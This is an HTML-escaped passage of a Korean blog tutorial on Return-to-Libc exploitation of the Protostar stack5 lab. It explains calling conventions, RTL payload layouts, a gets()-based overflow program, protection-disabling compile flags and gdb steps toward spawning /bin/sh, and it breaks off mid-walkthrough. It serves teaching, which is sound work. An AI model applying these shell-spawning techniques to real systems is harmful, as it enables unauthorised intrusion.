  &lt;li&gt;32bit architecture의 함수 calling convention과 64bit architecture의 함수 calling convention은 레지스터 확보 문제로 인해 달라졌다.&lt;/li&gt;
  &lt;li&gt;32 bit architecture에서는 안 그래도 부족한 용량이라 연산 시 가상메모리 외의 용량 자원인 레지스터를 더 잘 써야 할 필요성이 있다. 즉, 그 귀한 레지스터를 꼴랑 함수의 파라미터를 저장하는 데 사용하지 않는다. 결과적으로 함수의 파라미터는 스택에 저장되어 전달된다.&lt;/li&gt;
  &lt;li&gt;64 bit architecture에서는 이야기가 다르다. 함수의 파라미터가 레지스터 6개에 먼저 저장되고, 그래도 파라미터가 남으면 남은 파라미터를 스택에 저장하기 때문이다.
    &lt;ul&gt;
      &lt;li&gt;64bit 구조가 되면서 메모리 주소 체계도 달라져 프로세스에 할당 가능한 가상 메모리 크기가 16EB까지 올라갔다. 그로 인해 원래 레지스터가 감당해야 했던 저장의 필요성이 사라지며 잉여 레지스터들이 생기게 되었다.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;컴퓨터구조를 배운 사람들이라면 레지스터 메모리가 가장 빠른 메모리임을 알 것이다. 메모리들의 가용 용량/속도의 관계를 나타낸 이미지를 첨부한다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;가장 빈번하게 읽어와야 하는 것이 함수의 파라미터이기 때문에 속도의 효율성을 위해 레지스터에 파라미터를 저장하는 것으로 함수의 calling convention을 정의하게 되었다. 그렇게 하더라도 저장 성능 오버헤드 대비 속도 이득이 훨씬 높기 때문이다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;이로 인해 RTL 기법을 이용한 익스플로잇 수행 시 입력해야 할 페이로드의 형태가 달라졌다. 다음 장에서 자세히 설명할 것이므로 아래에는 페이로드의 구성만 언급한다.
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;32bit&lt;/p&gt;

        &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Library&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*(ret of the libc function)*/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;64bit (왜 페이로드가 이런 꼴인지 이해가 어려울 수 있지만, 아래에서 RSP의 위치 변동을 감안하며 설명하겠다)&lt;/p&gt;

        &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Gadget&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Library&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-x86-기반에서-rtl-수행하기&quot;&gt;1. X86 기반에서 RTL 수행하기&lt;/h1&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;11-파라미터가-스택에&quot;&gt;1.1. 파라미터가 스택에?&lt;/h2&gt;

&lt;p&gt;C 언어의 경우 함수의 Calling Convention을 정의해 둔 것은 __cdecl이다. 관련해 좀 더 자세한 설명과 리눅스에서 cdecl 사용을 확인하는 과정은 &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step5/#/&quot;&gt;여기&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;만일 sum(1, 2)를 콜했다면 sum 함수의 line 1에 들어섰을 때의 스택 구조는 아래와 같을 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Stack frame of Callee over EBP and RET&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;EBP(SFP of the caller)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;RET&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Stack frame of the Caller&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;파라미터는 마지막 파라미터부터 스택에 push된다는 점을 다시 한 번 주지하고자 한다. 왜냐하면 ESP는 pop될 때 낮은 주소에서 높은 주소로 이동하기 때문이다. 즉, 파라미터를 스택에 push한 것과 거꾸로의 순서를 따라 파라미터를 읽어오기 때문에 마지막 파라미터부터 push하는 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;12-rtl을-위한-스택-조작&quot;&gt;1.2. RTL을 위한 스택 조작&lt;/h2&gt;

&lt;p&gt;위에서 말한 Cdecl 규약에 따른다면, RTL을 하기 위해서는 어떤 식으로 스택을 조작해야 할까?&lt;/p&gt;

&lt;p&gt;해결책은 정말 간단하고 논리적이다. RET address를 Libc에 올라가 있는 특정 함수의 주소로 조작하고, 해당 함수가 제공하는 기능을 이용하여 쉘 프로세스를 실행할 수 있도록 해당 함수의 파라미터 형식에 맞는 파라미터를 Cdecl 규약에 부합하도록 적합한 위치에 넣어두는 것이다.&lt;/p&gt;

&lt;p&gt;위의 설명만 읽으면 직전에 말한 간단하다는 말이 무색할 만큼 복잡하기 짝이 없어 보인다. 그러니 아래 그림을 보자. BOF 취약점으로 스택을 조작할 수 있다는 전제 하에서 그린 그림이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Dump bytes(Overflowed)&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Corrupted EBP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Libc function address(Corrupted RET) (1)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Will be RET of a called libc function (4 bytes) (2)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1st Param of the function&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2nd Param of the function&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;…&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;따라서, BOF 취약점이 존재한다고 가정할 때 페이로드의 구조는 아래와 같을 수밖에 없다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Library&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameters&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reverse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;order&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;물론 다른 함수 호출 규약을 쓴다면 그건 그거대로 반영해야 할 문제일 테다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;추가로, RET와 parameter 사이에 대체 왜 콜리의 리턴 주소가 위치하게 되는지 궁금할 수 있다. 만일 RTL로 실행한 Libc 함수가 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;이라고 하면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rip&lt;/code&gt;는 위의 스택 구조 중 (1)에 있는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; 함수의 엔트리로 점프하게 되고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsp&lt;/code&gt;는 바로 아래인 (2)를 가리키게 될 것이다.
그런데 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cdedl&lt;/code&gt; calling convention에서 스택을 정리하고 만드는 것은 Caller이기 때문에 Callee인 함수 입장에서는 이미 스택 정리가 모두 되어 스택의 프롤로그인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push rbp; mov rbp, rsp (이하 로컬변수 자리 확보 과정 생략)&lt;/code&gt;가 실행되기 직전까지의 행동이 모두 진행되었다고 생각할 것이다. 즉, 현재의 스택 프레임을 만들기 직전 과정인 Callee가 끝나고 다시 돌아가야 할 Caller의 이후 인스트럭션 주소인 RET가 스택에 전부 저장되었다고 생각할 것이다. 따라서 정규 과정 없이 RTL을 이용해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;을 콜했더라도 이 과정에서 Callee인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; 함수의 입장에서는 Caller의 RET까지가 전부 스택에 저장되어 있으리라 생각하므로 자동으로 (2)는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; 의 RET 주소로서 parameter를 가져올 때 건너뛰는 위치가 된다.
이로 인해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;system&lt;/code&gt;인 (1)과 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; 에서 참조하는 파라미터들의 사이에 스택 한 주소만큼(4 byte)의 빈 공간이 생기게 되는 것이다. 
&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;13-실습&quot;&gt;1.3. 실습&lt;/h2&gt;

&lt;p&gt;어떠한 프로그램을 익스플로잇하기 위해서는 아래와 같은 과정을 거쳐야 한다.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;대상 프로그램 분석해 취약점 지정&lt;/li&gt;
  &lt;li&gt;해당 취약점을 익스플로잇할 방법 지정&lt;/li&gt;
  &lt;li&gt;익스플로잇 생성&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;실습에서는 위의 과정에 따라 순차적으로 익스플로잇 방식을 설명한다.&lt;/p&gt;

&lt;h3 id=&quot;131-대상-프로그램-분석해-취약점-지정&quot;&gt;1.3.1. 대상 프로그램 분석해 취약점 지정&lt;/h3&gt;

&lt;p&gt;프로그램의 소스 코드를 주었기 때문에 문제의 난이도가 낮은 편이다. 아래 소스 코드를 분석하며 취약점을 찾아 보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt; 
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                                                        
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 
  &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;사용자의 입력값을 받아 지역 변수에 저장하는 간단한 프로그램이다. 그런데, 사용자의 입력값을 받을 때 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; 함수를 사용했다는 점에서 문제가 있다. 흔히 Boundary check라고 하는 사용자 입력값 길이 확인을 하지 않는 함수이기 때문이다. 즉, 위 프로그램의 문제는 gets 함수를 사용한 것으로, 해당 함수는 사용자가 주는 대로 전부 받아 저장하기 때문에 Buffer Overflow 취약점이 존재하는 함수이기 때문에 위 프로그램 또한 BOF 취약점을 가지게 되었다.&lt;/p&gt;

&lt;h3 id=&quot;132-bof-취약점-익스플로잇할-방법-지정&quot;&gt;1.3.2. BOF 취약점 익스플로잇할 방법 지정&lt;/h3&gt;

&lt;p&gt;이번에는 BOF와 연계한 RTL 방식으로 쉘을 딸 것이다. BOF-RTL에 사용될 페이로드가 아래와 같기 때문에, 성공시키기 위해 알아야만 하는 정보는&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;몇 바이트를 넣어야 EBP까지를 오염시킬 수 있는가&lt;/li&gt;
  &lt;li&gt;Libc의 어떤 함수를 쓸 것인가&lt;/li&gt;
  &lt;li&gt;해당 함수의 메모리상 주소는 무엇인가&lt;/li&gt;
  &lt;li&gt;Libc 내부에 해당 함수가 쉘을 실행시키도록 사용할 수 있는 파라미터가 하드코딩되어 있는가&lt;/li&gt;
  &lt;li&gt;그렇다면 해당 파라미터는 어디에 있는가&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Library&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;1.3.2.1. offset bytes 구하기&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;pwndbg를 stack5에 물려 보았다. 컴파일 옵션은 아래와 같다.(주의!! 아래 컴파일 옵션을 사용하면 안된다! &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-mpreferred-stack-boundary=2&lt;/code&gt; 로 해야 한다!!!! 이유는 마지막에 가서 설명하겠다)&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;gcc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;m32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mpreferred&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;boundary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fno&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;protector&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;execstack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fno&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pic&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disas main&lt;/code&gt; 명령어로 얻은 어셈블리 덤프는 아래와 같다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%201.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

&lt;p&gt;main 함수가 파라미터를 받는 형식이라 해당 파라미터를 내부적으로 처리하기 위해 공간을 확보한다. 그러나 그것에 신경쓸 필요 없이, gets 심볼이 딸린 call 직전의 어셈블리어에 집중하다.&lt;/p&gt;

&lt;p&gt;gets는 파라미터로 char* 버퍼의 시작 주소를 받는다. 파라미터가 하나뿐이므로 cdecl 규약에 따라 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*(main+24)&lt;/code&gt;에서 스택에 push 되는 부분이 파라미터를 스택에 넣는 행위일 것이다. eax에 있는 값을 넣기 때문에 eax에 무슨 값이 들어가는지 따라가 보면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ebp-0x48]&lt;/code&gt; 을 lea 명령어를 이용해 eax에 주는 것을 확인할 수 있다. lea 명령어를 이용했으므로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ebp-0x48]&lt;/code&gt; 은 주소로서 취급된다. 즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ebp-0x48]&lt;/code&gt; 이 바로 BOF을 일으킬 시작 주소가 된다.&lt;/p&gt;

&lt;p&gt;buffer 변수는 64byte인데 왜 0x48, 즉 64+8 byte 만 주는지 궁금할 수 있다. 이전 포스트에서도 언급한 것처럼, gcc 컴파일러가 보안 정책의 일환으로 문자 배열을 만들 때 추가적으로 공간을 더 할당해 주기 때문이다. 일반적으로 8 byte~16 byte 정도의 공간을 더 주는 것으로 알고 있다.&lt;/p&gt;

&lt;p&gt;따라서, 0x48byte를 모두 채우면 ebp의 바로 위까지를 변조할 수 있기 때문에 우리가 주어야 할 &lt;strong&gt;offset byte는 0x48+0x4 = 0x4c byte&lt;/strong&gt;가 될 것이다.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1.3.2.2. Library Function Address와 parameter 로 쓸 문자열 주소 구하기&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;먼저 쉘을 따는 데 사용할 수 있는 libc 내부 함수들이 많지만, 이번에는 system()함수를 사용해 보려 한다. system() 함수의 사용 규약은 아래와 같다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://man7.org/linux/man-pages/man3/system.3.html&quot;&gt;Document&lt;/a&gt;에 따르면, system() 함수는 fork(2) 시스템 콜을 이용해 execl(3) 함수를 실행하는 child process를 만들어 아래와 같은 커맨드를 실행한다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;execl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;즉 command 변수에 들어간 문자열에 해당되는 쉘 명령어가 실행된다. 나는 쉘을 실행하고 싶기 때문에 /bin/sh를 넣어야 한다.&lt;/p&gt;

&lt;p&gt;그렇다면 system() 함수의 주소와 파라미터로 들어갈 “/bin/sh” 문자열이 하드코딩되어 있는 주소는 어떻게 구할 수 있을까. 크게 세 가지 방식이 있다. 1) gdb를 이용하기 2) libc에서 찾기 3) pwntools 이용해 libc 뒤지기.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;gdb 이용하기&lt;/p&gt;

    &lt;p&gt;프로그램이 시작해야 라이브러리가 메모리에 로딩되기 때문에 프로그램을 돌려놓고 system의 주소를 찾아야 한다. 그러나 그냥 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt; 명령어로 프로그램을 돌려버리면 프로그램이 끝나버려서 메모리에 로딩된 라이브러리도 증발한다. 따라서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b main&lt;/code&gt; 명령어로 브레이크 포인트를 걸고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r&lt;/code&gt; 명령어를 입력한다.&lt;/p&gt;

    &lt;p&gt;이후 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;p system&lt;/code&gt; 명령어를 입력하면 아래와 같은 결과를 볼 수 있다.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%202.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;

